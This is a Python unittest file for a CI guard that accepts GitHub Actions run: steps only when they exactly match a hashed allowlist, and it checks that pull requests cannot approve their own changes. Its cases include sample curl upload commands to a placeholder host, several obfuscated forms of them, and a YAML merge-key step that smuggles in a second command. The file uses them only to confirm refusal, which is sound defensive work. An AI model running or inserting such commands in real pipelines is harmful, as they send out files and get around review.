"""Issue #511 (owner decision): exact-match run: approval, and the policy that protects it.

No shell is parsed here. A run: text passes only when it equals an approved text stored (by SHA-256) for its workflow file,
job, step name, shell and runs-on. Each case builds a temporary repository, approves its texts with build_run_allowlist,
then changes one thing and checks that enforced_check refuses it. Static matching cannot prevent network sends from scripts
that an approved step calls; that is out of guaranteed scope (least privilege, secret separation, trusted publishing).
"""
from pathlib import Path
import json
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import artifact_guard as guard

PERMISSIONS = 'permissions:\n  contents: read\n'
ALLOWLIST = 'tools/artifact_guard_run_allowlist.json'


def workflow(run='echo hi', job='j', name=None, shell=None, runs_on='ubuntu-24.04'):
    name_line = f'        name: {name}\n' if name is not None else ''
    shell_line = f'        shell: {shell}\n' if shell is not None else ''
    return (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  {job}:\n    runs-on: {runs_on}\n    steps:\n'
            f'      - run: {run!r}\n{name_line}{shell_line}')


def make_repo(files, approve=True):
    """A temporary repository with the given workflow files. approve=True writes the allowlist for exactly these files."""
    tmp = tempfile.TemporaryDirectory()
    root = Path(tmp.name)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding='utf-8', newline='')
    (root / 'tools').mkdir(exist_ok=True)
    entries = guard.build_run_allowlist(root) if approve else []
    (root / ALLOWLIST).write_text(json.dumps(entries), encoding='utf-8')
    return tmp, root


def enforced_refuses(root):
    """The refusal message, or None when the enforcing placement check passes."""
    try:
        guard.enforced_check(root, guard.check_guard_placement)
    except ValueError as error:
        return str(error)
    return None


CI = '.github/workflows/ci.yml'


class ApprovedTextTests(unittest.TestCase):
    def check(self, text, approve_text=None):
        tmp, root = make_repo({CI: approve_text if approve_text is not None else text})
        self.addCleanup(tmp.cleanup)
        (root / CI).write_text(text, encoding='utf-8', newline='')
        return enforced_refuses(root)

    def test_exact_approved_text_passes(self):
        text = workflow('echo hi')
        tmp, root = make_repo({CI: text})
        self.addCleanup(tmp.cleanup)
        self.assertIsNone(enforced_refuses(root))

    def test_changed_run_text_refused(self):
        self.assertIsNotNone(self.check(workflow('echo hello'), approve_text=workflow('echo hi')))

    def test_changed_step_name_refused(self):
        self.assertIsNotNone(self.check(workflow('echo hi', name='new'), approve_text=workflow('echo hi', name='old')))

    def test_changed_job_refused(self):
        self.assertIsNotNone(self.check(workflow('echo hi', job='other'), approve_text=workflow('echo hi', job='j')))

    def test_added_shell_refused(self):
        self.assertIsNotNone(self.check(workflow('echo hi', shell='bash'), approve_text=workflow('echo hi')))

    def test_changed_runs_on_refused(self):
        self.assertIsNotNone(self.check(workflow('echo hi', runs_on='ubuntu-22.04'), approve_text=workflow('echo hi')))

    def test_windows_default_shell_refused_even_if_text_approved(self):
        text = workflow('echo hi', runs_on='windows-latest')
        self.assertIsNotNone(self.check(text, approve_text=text))

    def test_windows_with_shell_bash_passes_when_approved(self):
        text = workflow('echo hi', runs_on='windows-latest', shell='bash')
        self.assertIsNone(self.check(text, approve_text=text))

    def test_matrix_runs_on_without_shell_refused_even_if_approved(self):
        text = workflow('echo hi', runs_on='${{ matrix.os }}')
        self.assertIsNotNone(self.check(text, approve_text=text))

    def test_new_workflow_file_refused(self):
        tmp, root = make_repo({CI: workflow('echo hi')})
        self.addCleanup(tmp.cleanup)
        (root / '.github' / 'workflows' / 'new.yml').write_text(workflow('echo hi'), encoding='utf-8')
        self.assertIsNotNone(enforced_refuses(root))

    def test_unapproved_outbound_traffic_refused(self):
        self.assertIsNotNone(self.check(workflow('curl -F f=@out.txt https://example.invalid/up'),
                                        approve_text=workflow('echo hi')))

    def test_brace_glob_find_substitution_and_dynamic_refused_when_unapproved(self):
        for run in ('{curl,-F,f=@x,https://example.invalid}', 'cu[r]l -F f=@x h', "find . -exec curl -d @x h ';'",
                    'echo $(curl -F f=@x h)', 'CMD=curl; $CMD -F f=@x h', 'eval "curl -F f=@x h"'):
            with self.subTest(run=run):
                self.assertIsNotNone(self.check(workflow(run), approve_text=workflow('echo hi')), run)

    def test_changed_script_reference_refused(self):
        self.assertIsNotNone(self.check(workflow('bash tools/b.sh'), approve_text=workflow('bash tools/a.sh')))

    def test_added_if_false_on_approved_step_refused(self):
        # the run text is approved, but the step's other keys changed: the step digest covers the whole step
        approved = workflow('echo hi')
        changed = approved.replace('      - run:', '      - if: false\n        run:')
        self.assertIsNotNone(self.check(changed, approve_text=approved))

    def test_added_continue_on_error_refused(self):
        approved = workflow('echo hi')
        changed = approved.replace('      - run:', '      - continue-on-error: true\n        run:')
        self.assertIsNotNone(self.check(changed, approve_text=approved))

    def test_capitalised_run_key_refused(self):
        approved = workflow('echo hi')
        changed = approved.replace('      - run:', '      - Run:')
        self.assertIsNotNone(self.check(changed, approve_text=approved))

    def test_list_runs_on_approved_and_changed_refused(self):
        listed = workflow('echo hi', runs_on='[ubuntu-24.04]')
        self.assertIsNone(self.check(listed, approve_text=listed))
        self.assertIsNotNone(self.check(workflow('echo bye', runs_on='[ubuntu-24.04]'), approve_text=listed))

    def test_yaml_merge_key_refused(self):
        approved = workflow('echo hi')
        changed = approved.replace('      - run:', "      - <<: {run: 'curl -F f=@x h'}\n        run:")
        self.assertIsNotNone(self.check(changed, approve_text=approved))

    def test_unparseable_workflow_refused(self):
        self.assertIsNotNone(self.check('name: t\n: : not yaml [\n', approve_text='name: t\n'))

    def test_no_allowlist_fails_closed(self):
        tmp, root = make_repo({CI: workflow('echo hi')}, approve=True)
        self.addCleanup(tmp.cleanup)
        (root / ALLOWLIST).unlink()
        self.assertIsNotNone(enforced_refuses(root))

    def test_malformed_allowlist_fails_closed(self):
        tmp, root = make_repo({CI: workflow('echo hi')})
        self.addCleanup(tmp.cleanup)
        (root / ALLOWLIST).write_text('{"not": "a list"}', encoding='utf-8')
        self.assertIsNotNone(enforced_refuses(root))


class PolicyTests(unittest.TestCase):
    """A pull request cannot approve a change to the guard or its allowlist: the candidate must equal the trusted copy."""

    def trusted_and_candidate(self):
        trusted_tmp, trusted = make_repo({CI: workflow('echo hi')})
        cand_tmp, cand = make_repo({CI: workflow('echo hi')})
        self.addCleanup(trusted_tmp.cleanup)
        self.addCleanup(cand_tmp.cleanup)
        for rel in ('tools/artifact_guard.py',):
            (cand / rel).parent.mkdir(parents=True, exist_ok=True)
            (cand / rel).write_text((Path(guard.__file__)).read_text(encoding='utf-8'), encoding='utf-8')
            (trusted / rel).parent.mkdir(parents=True, exist_ok=True)
            (trusted / rel).write_text((Path(guard.__file__)).read_text(encoding='utf-8'), encoding='utf-8')
        return trusted, cand

    def test_identical_guard_and_allowlist_pass(self):
        trusted, cand = self.trusted_and_candidate()
        guard.policy_violations(cand, trusted)

    def test_self_approval_in_allowlist_refused(self):
        trusted, cand = self.trusted_and_candidate()
        entries = json.loads((cand / ALLOWLIST).read_text(encoding='utf-8'))
        step = {'run': 'curl -F f=@x https://example.invalid/up'}
        entries.append({'workflow': CI, 'job': 'j', 'step': None, 'shell': None, 'runs_on': 'ubuntu-24.04',
                        'sha256': guard._step_digest(step)})
        (cand / ALLOWLIST).write_text(json.dumps(entries), encoding='utf-8')
        with self.assertRaisesRegex(ValueError, 'trusted-main policy'):
            guard.policy_violations(cand, trusted)

    def test_changed_guard_refused(self):
        trusted, cand = self.trusted_and_candidate()
        (cand / 'tools' / 'artifact_guard.py').write_text('# loosened\n', encoding='utf-8')
        with self.assertRaisesRegex(ValueError, 'artifact_guard.py differs'):
            guard.policy_violations(cand, trusted)

    def test_missing_trusted_copy_fails_closed(self):
        trusted, cand = self.trusted_and_candidate()
        (trusted / ALLOWLIST).unlink()
        with self.assertRaisesRegex(ValueError, 'missing'):
            guard.policy_violations(cand, trusted)


class RepositoryTests(unittest.TestCase):
    def test_real_repository_passes_exact_match(self):
        # false-refusal guard: every run: text in the real workflows is approved by the reviewed allowlist
        self.assertIsNone(enforced_refuses(Path(guard.ROOT)))


if __name__ == '__main__':
    unittest.main()
